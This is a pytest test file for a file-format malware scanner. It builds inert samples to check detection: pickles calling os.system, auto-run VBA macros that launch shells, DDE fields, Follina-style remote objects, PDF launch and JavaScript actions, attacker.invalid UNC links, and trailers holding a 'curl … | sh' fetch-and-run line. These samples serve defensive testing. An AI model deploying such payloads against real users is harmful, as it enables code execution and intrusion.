"""Model files, office documents, PDFs and images: what runs on open, read without opening.

The inputs are built here, byte by byte, from the published format specifications (MS-CFB,
MS-OVBA, the pickle opcode set, PNG/JPEG/GIF). Nothing is ever loaded: a pickle that names
`os.system` is inert until something unpickles it, and nothing in this module does.
"""

from __future__ import annotations

import collections
import io
import os
import pickle
import struct
import zipfile
import zlib
from pathlib import Path

import pytest

from cordon_scanner import Scanner
from cordon_scanner.core.config import Config
from cordon_scanner.formats import FormatError, documents, media, ole, pickles
from formatkit import (
    Reduces,
    compound,
    gif,
    jpeg,
    ooxml,
    ovba_literal,
    png,
    relationship,
    vba_project,
)


def _scan(tmp_path: Path, files: dict[str, bytes]):
    for name, data in files.items():
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
    return Scanner(Config()).scan(tmp_path)


def _rules(result) -> dict[str, list]:
    found: dict[str, list] = collections.defaultdict(list)
    for finding in result.findings:
        found[finding.rule_id].append(finding)
    return found


# -- pickles -------------------------------------------------------------------------------------


class TestPickles:
    def test_a_reduce_to_os_system_is_named(self) -> None:
        for protocol in (0, 2, 4, 5):
            report = pickles.PickleReader.read(
                pickle.dumps(Reduces(os.system, "true"), protocol=protocol)
            )
            assert any(i.dangerous and i.name == "system" for i in report.imports), protocol

    def test_an_ordinary_model_pickle_is_recognised(self) -> None:
        report = pickles.PickleReader.read(
            pickle.dumps(collections.OrderedDict(a=[1, 2]), protocol=4)
        )
        assert report.imports
        assert all(i.recognised and not i.dangerous for i in report.imports)

    def test_a_decoy_string_between_the_names_does_not_hide_the_import(self) -> None:
        stream = (
            b"\x80\x04"
            + b"\x8c\x02os\x94"
            + b"\x8c\x06system\x94"
            + b"\x8c\x05decoy0"  # pushed, then POPped
            + b"\x93"
            + b"\x8c\x04true\x85R."
        )
        [found] = pickles.PickleReader.read(stream).imports
        assert (found.module, found.name) == ("os", "system")

    def test_names_fetched_back_from_the_memo_are_followed(self) -> None:
        stream = b"\x80\x04\x8c\x02os\x94\x8c\x06system\x9400h\x00h\x01\x93\x8c\x04true\x85R."
        [found] = pickles.PickleReader.read(stream).imports
        assert found.dotted == "os.system"

    def test_the_import_is_still_found_when_the_file_was_read_in_part(self) -> None:
        whole = pickle.dumps([Reduces(os.system, "true"), list(range(5000))], protocol=4)
        report = pickles.PickleReader.read(whole[: len(whole) // 2], truncated=True)
        assert report.partial
        assert any(i.dangerous for i in report.imports)

    def test_a_pytorch_zip_is_opened(self) -> None:
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w", zipfile.ZIP_STORED) as archive:
            archive.writestr(
                "archive/data.pkl", pickle.dumps(Reduces(os.system, "true"), protocol=2)
            )
            archive.writestr("archive/data/0", b"\x00" * 64)
        raw = buffer.getvalue()
        assert pickles.PickleReader.looks_like_pickle(raw)
        assert any(
            i.dangerous and i.member == "archive/data.pkl"
            for i in pickles.PickleReader.read(raw).imports
        )
        # Read in part: no central directory, so the local headers are walked instead.
        cut = raw[: raw.index(b"archive/data/0")]
        assert any(i.dangerous for i in pickles.PickleReader.read(cut, truncated=True).imports)

    def test_bytes_that_are_not_a_pickle_are_refused(self) -> None:
        with pytest.raises(FormatError):
            pickles.PickleReader.read(b"\xff\xfe not a pickle")

    def test_the_opcode_budget_holds(self, monkeypatch) -> None:
        monkeypatch.setattr(pickles, "MAX_OPCODES", 10)
        with pytest.raises(FormatError, match="opcodes"):
            pickles.PickleReader.read(pickle.dumps(list(range(100)), protocol=2))


class TestPicklesInAScan:
    def test_a_dangerous_model_is_malware(self, tmp_path) -> None:
        found = _rules(
            _scan(tmp_path, {"model.pkl": pickle.dumps(Reduces(os.system, "true"), protocol=4)})
        )
        [hit] = found["MALWARE.MODEL.PICKLE_EXEC.001"]
        assert "system" in hit.message

    def test_an_unfamiliar_import_is_reported_below_malware(self, tmp_path) -> None:
        raw = b"\x80\x02cmy_lab.tools\nbuild\nq\x00)Rq\x01."
        found = _rules(_scan(tmp_path, {"model.pkl": raw}))
        assert not found["MALWARE.MODEL.PICKLE_EXEC.001"]
        [hit] = found["SUSPECT.MODEL.PICKLE_IMPORT.001"]
        assert "my_lab.tools.build" in hit.message

    def test_a_generic_bin_file_is_not_read_as_a_pickle(self, tmp_path) -> None:
        result = _scan(tmp_path, {"firmware.bin": bytes(range(256)) * 4})
        assert not [f for f in result.findings if f.detector == "formats"]
        assert result.complete

    def test_an_unreadable_pickle_leaves_the_scan_incomplete(self, tmp_path) -> None:
        result = _scan(tmp_path, {"weights.pkl": b"\xff\x00\x01 garbage"})
        assert "OPERATIONAL.FORMAT.UNREADABLE" in _rules(result)
        assert not result.complete


# -- OLE and VBA ---------------------------------------------------------------------------------


class TestVbaDecompression:
    def test_the_specification_example_with_copy_tokens(self) -> None:
        """MS-OVBA 3.2.2, which exercises copy tokens across bit-count widths."""
        compressed = bytes.fromhex(
            "012FB000236161616263646582660070616768696A01380861"
            "6B6C00306D6E6F700671027004107273747576107778797A003C"
        )
        assert (
            ole.VbaSource.decompress(compressed)
            == b"#aaabcdefaaaaghijaaaaaklaaamnopqaaaaaaaaaaaarstuvwxyzaaa"
        )

    def test_a_copy_token_before_its_chunk_is_refused(self) -> None:
        with pytest.raises(FormatError):
            ole.VbaSource.decompress(b"\x01\x03\xb0\x01\x00\x70")

    def test_the_output_budget_holds(self, monkeypatch) -> None:
        monkeypatch.setattr(ole, "MAX_SOURCE_BYTES", 100)
        with pytest.raises(FormatError):
            ole.VbaSource.decompress(ovba_literal(b"A" * 400))


class TestCompoundFiles:
    def test_modules_are_found_and_decompressed(self) -> None:
        source = 'Sub AutoOpen()\r\n  Shell "calc"\r\nEnd Sub\r\n'
        [module] = ole.VbaSource.vba_modules(ole.CompoundFile(vba_project(source)))
        assert module.name == "Module1"
        assert "Shell" in module.source

    def test_an_unreadable_dir_falls_back_to_the_attribute_search(self) -> None:
        cache = b"\xcc" * 40
        code = ovba_literal(b'Attribute VB_Name = "M"\r\nSub Document_Open()\r\nEnd Sub\r\n')
        raw = compound({"VBA/dir": b"\x00\x01\x02", "VBA/M": cache + code})
        [module] = ole.VbaSource.vba_modules(ole.CompoundFile(raw))
        assert "Document_Open" in module.source

    def test_a_sector_loop_is_refused(self) -> None:
        raw = bytearray(vba_project("Sub X()\r\nEnd Sub\r\n"))
        struct.pack_into("<I", raw, 512 + 4 * 3, 3)  # the module's sector points at itself
        with pytest.raises(FormatError):
            ole.VbaSource.vba_modules(ole.CompoundFile(bytes(raw)))

    def test_a_small_stream_is_read_from_the_ministream(self) -> None:
        raw = bytearray(compound({"Data": b"x" * 64}))
        # Rewrite it as a mini stream: cutoff 4096, root owns a one-sector mini stream at
        # sector 2 whose first 64-byte mini sector is the data, mini FAT at sector 3.
        struct.pack_into("<I", raw, 0x38, 4096)
        struct.pack_into("<II", raw, 0x3C, 3, 1)
        fat_offset = 512
        struct.pack_into("<II", raw, fat_offset + 8, 0xFFFFFFFE, 0xFFFFFFFE)
        root = 512 + 512
        struct.pack_into("<IQ", raw, root + 116, 2, 64)
        stream = root + 128
        struct.pack_into("<IQ", raw, stream + 116, 0, 64)
        minifat = struct.pack("<I", 0xFFFFFFFE) + b"\xff" * 508
        raw = raw[: 512 * 4] + minifat
        cfb = ole.CompoundFile(bytes(raw))
        [entry] = cfb.find("Data")
        assert cfb.open(entry) == b"x" * 64


# -- office documents ----------------------------------------------------------------------------


class TestOfficeDocuments:
    def test_an_auto_open_macro_that_runs_a_program(self) -> None:
        raw = ooxml(
            {
                "word/vbaProject.bin": vba_project(
                    'Sub AutoOpen()\r\n  Shell "cmd /c whoami"\r\nEnd Sub\r\n'
                )
            }
        )
        kinds = {s.kind for s in documents.DocumentReader.read(raw, "report.docm").signals}
        assert {"macro", "auto_exec"} <= kinds

    def test_a_macro_that_runs_nothing_by_itself_is_only_a_macro(self) -> None:
        raw = ooxml(
            {"xl/vbaProject.bin": vba_project('Sub Tidy()\r\n  Shell "calc"\r\nEnd Sub\r\n')}
        )
        kinds = {s.kind for s in documents.DocumentReader.read(raw, "book.xlsm").signals}
        assert kinds == {"macro"}

    def test_an_ole_document_with_macros(self) -> None:
        raw = vba_project(
            'Sub Workbook_Open()\r\n  CreateObject("WScript.Shell")\r\nEnd Sub\r\n', prefix=""
        )
        kinds = {s.kind for s in documents.DocumentReader.read(raw, "legacy.xls").signals}
        assert "auto_exec" in kinds

    def test_a_remote_template(self) -> None:
        raw = ooxml(
            {
                "word/_rels/settings.xml.rels": relationship(
                    "attachedTemplate", "https://cdn.example.net/t.dotm"
                )
            }
        )
        [signal] = documents.DocumentReader.read(raw, "report.docx").signals
        assert signal.kind == "remote_object"
        assert "https://cdn.example.net" in signal.detail

    def test_the_follina_object_form(self) -> None:
        raw = ooxml(
            {
                "word/_rels/document.xml.rels": relationship(
                    "oleObject", "mhtml:https://cdn.example.net/x.html!x-usc:y"
                )
            }
        )
        assert [s.kind for s in documents.DocumentReader.read(raw, "report.docx").signals] == [
            "remote_object"
        ]

    def test_hyperlinks_and_internal_relationships_are_ordinary(self) -> None:
        raw = ooxml(
            {
                "word/_rels/document.xml.rels": relationship("hyperlink", "https://example.org/"),
                "word/_rels/settings.xml.rels": relationship(
                    "attachedTemplate", "Normal.dotm", external=False
                ),
            }
        )
        assert documents.DocumentReader.read(raw, "report.docx").signals == []

    def test_a_dde_field(self) -> None:
        body = '<w:document><w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\x\\\\cmd.exe "/k calc"</w:instrText></w:r></w:document>'
        raw = ooxml({"word/document.xml": body})
        assert [s.kind for s in documents.DocumentReader.read(raw, "memo.docx").signals] == ["dde"]

    def test_an_excel_4_macro_sheet(self) -> None:
        raw = ooxml({"xl/macrosheets/sheet1.xml": "<xm:macrosheet/>"})
        assert [s.kind for s in documents.DocumentReader.read(raw, "book.xlsm").signals] == [
            "macro_sheet"
        ]


class TestPdf:
    def test_open_action_javascript_hidden_in_an_object_stream_with_escaped_names(self) -> None:
        hidden = zlib.compress(
            b"<</Type/Catalog/OpenAction 5 0 R>> <</S/J#61vaScript/JS(app.alert(1))>>"
        )
        raw = (
            b"%PDF-1.7\n4 0 obj<</Type/ObjStm/Filter/FlateDecode/Length "
            + str(len(hidden)).encode()
            + b">>stream\n"
            + hidden
            + b"\nendstream endobj\n%%EOF"
        )
        kinds = {s.kind for s in documents.DocumentReader.read(raw, "invoice.pdf").signals}
        assert kinds == {"pdf_auto_action"}

    def test_launch_and_an_embedded_executable(self) -> None:
        raw = (
            b"%PDF-1.4\n1 0 obj<</Type/Action/S/Launch/F(cmd.exe)>>endobj\n"
            b"2 0 obj<</Type/Filespec/F(invoice.exe)/EF<</F 3 0 R>>>>endobj\n"
            b"3 0 obj<</Type/EmbeddedFile/Length 2>>stream\nMZ\nendstream endobj\n%%EOF"
        )
        kinds = {s.kind for s in documents.DocumentReader.read(raw, "invoice.pdf").signals}
        assert kinds == {"pdf_launch", "pdf_embedded_executable"}

    def test_javascript_without_an_open_action(self) -> None:
        raw = b"%PDF-1.4\n1 0 obj<</S/JavaScript/JS(this.print())>>endobj\n%%EOF"
        assert [s.kind for s in documents.DocumentReader.read(raw, "form.pdf").signals] == [
            "pdf_javascript"
        ]

    def test_a_link_annotation_is_ordinary(self) -> None:
        raw = b"%PDF-1.4\n1 0 obj<</Type/Annot/Subtype/Link/A<</S/URI/URI(https://example.org/)>>>>endobj\n%%EOF"
        assert documents.DocumentReader.read(raw, "manual.pdf").signals == []

    def test_the_inflation_budget_is_shared_across_streams(self, monkeypatch) -> None:
        monkeypatch.setattr(documents, "MAX_INFLATED_BYTES", 1000)
        body = zlib.compress(b"\x00" * 100_000)
        stream = b"1 0 obj<</Filter/FlateDecode>>stream\n" + body + b"\nendstream endobj\n"
        report = documents.DocumentReader.read(b"%PDF-1.4\n" + stream * 3, "big.pdf")
        assert report.partial


class TestRtf:
    def test_an_auto_updating_object(self) -> None:
        raw = rb"{\rtf1{\object\objemb\objupdate{\*\objclass Word.Document.8}{\*\objdata 0105}}}"
        assert [s.kind for s in documents.DocumentReader.read(raw, "cv.rtf").signals] == [
            "rtf_object"
        ]

    def test_the_equation_editor_class_hex_encoded_in_objdata(self) -> None:
        raw = (
            b"{\\rtf1{\\object\\objemb{\\*\\objdata 01050000"
            + b"Equation.3".hex().encode()
            + b"}}}"
        )
        [signal] = documents.DocumentReader.read(raw, "cv.rtf").signals
        assert "equation.3" in signal.detail

    def test_plain_rtf_is_ordinary(self) -> None:
        assert documents.DocumentReader.read(rb"{\rtf1\ansi Hello}", "note.rtf").signals == []


class TestDocumentsInAScan:
    def test_findings_and_severities(self, tmp_path) -> None:
        files = {
            "docs/report.docm": ooxml(
                {
                    "word/vbaProject.bin": vba_project(
                        'Sub AutoOpen()\r\n  Shell "calc"\r\nEnd Sub\r\n'
                    )
                }
            ),
            "docs/plain.docx": ooxml({"word/document.xml": "<w:document/>"}),
        }
        found = _rules(_scan(tmp_path, files))
        [hit] = found["SUSPECT.DOCUMENT.AUTO_EXEC.001"]
        assert hit.location.path == "docs/report.docm"
        assert "AutoOpen" in hit.message and "Shell" in hit.message
        assert not found["SUSPECT.DOCUMENT.MACRO.001"], "the auto-exec finding subsumes it"


# -- images --------------------------------------------------------------------------------------


class TestImageTrailers:
    @pytest.mark.parametrize("build", [png, jpeg, gif], ids=["png", "jpeg", "gif"])
    def test_a_clean_image_has_no_trailer(self, build) -> None:
        assert media.ImageTrailers.trailer(build()) is None

    def test_a_jpeg_thumbnail_end_marker_is_not_the_end(self) -> None:
        assert media.ImageTrailers.trailer(jpeg(thumbnail=True)) is None

    @pytest.mark.parametrize("build", [png, jpeg, gif], ids=["png", "jpeg", "gif"])
    def test_an_appended_archive_is_named(self, build) -> None:
        found = media.ImageTrailers.trailer(build(b"PK\x03\x04" + b"\x00" * 64))
        assert found is not None and found.looks_like == "a zip archive"

    def test_an_appended_script(self) -> None:
        found = media.ImageTrailers.trailer(
            png(b"#!/bin/sh\ncurl -sSL https://updates.invalid/x | sh\n")
        )
        assert found is not None and found.looks_like == "a script"

    def test_padding_is_not_a_trailer(self) -> None:
        assert media.ImageTrailers.trailer(png(b"\x00" * 4096)) is None
        assert media.ImageTrailers.trailer(jpeg(b"\n" * 8)) is None

    def test_unrecognised_trailing_data_is_reported_low(self, tmp_path) -> None:
        found = _rules(_scan(tmp_path, {"photo.png": png(os.urandom(0) + bytes(range(1, 200)))}))
        [hit] = found["SUSPECT.MEDIA.TRAILING_DATA.001"]
        assert hit.severity.name == "LOW"

    def test_a_png_without_iend_is_unreadable(self) -> None:
        with pytest.raises(FormatError):
            media.ImageTrailers.trailer(png()[:-12])


class TestRiskyPdfLinks:
    @pytest.mark.parametrize(
        "target",
        [
            "javascript:app.alert(1)",
            "file:///C:/Windows/System32/cmd.exe",
            "\\\\\\\\attacker.invalid\\\\share\\\\a.lnk",
            "search-ms:query=invoice&crumb=location:\\\\\\\\attacker.invalid",
            "https://cdn.example.net/update.exe",
            "https://cdn.example.net/setup.msi?ref=mail",
        ],
    )
    def test_a_risky_target(self, target) -> None:
        raw = b"%PDF-1.4\n1 0 obj<</S/URI/URI(" + target.encode() + b")>>endobj\n%%EOF"
        assert [s.kind for s in documents.DocumentReader.read(raw, "a.pdf").signals] == [
            "pdf_risky_uri"
        ]

    def test_an_ordinary_link_is_not(self) -> None:
        raw = b"%PDF-1.4\n1 0 obj<</S/URI/URI(https://example.org/docs/install.html)>>endobj\n%%EOF"
        assert documents.DocumentReader.read(raw, "a.pdf").signals == []


class TestZipAndOpaqueTrailers:
    def _zip(self) -> bytes:
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as archive:
            archive.writestr("a.txt", "hello\n")
            archive.comment = b"built by the release job"
        return buffer.getvalue()

    def test_a_zip_comment_is_not_a_trailer(self) -> None:
        assert media.ImageTrailers.trailer(self._zip()) is None

    def test_a_script_after_the_end_record(self) -> None:
        found = media.ImageTrailers.trailer(
            self._zip() + b"#!/bin/sh\ncurl -sSL https://updates.invalid/x | sh\n"
        )
        assert found is not None and found.format == "ZIP" and found.looks_like == "a script"

    def test_a_large_random_trailer_is_opaque(self, tmp_path) -> None:
        import random

        noise = random.Random(7).randbytes(8192)  # noqa: S311 - test data, not a secret
        found = media.ImageTrailers.trailer(png(noise))
        assert found is not None and found.opaque
        result = Scanner(Config()).scan(_write(tmp_path, "banner.png", png(noise)))
        assert "SUSPECT.MEDIA.OPAQUE_TRAILER.001" in {f.rule_id for f in result.findings}

    def test_metadata_after_the_end_is_not_opaque(self) -> None:
        found = media.ImageTrailers.trailer(png(b"Software: an editor\n" * 300))
        assert found is not None and not found.opaque


def _write(directory: Path, name: str, data: bytes) -> Path:
    (directory / name).write_bytes(data)
    return directory
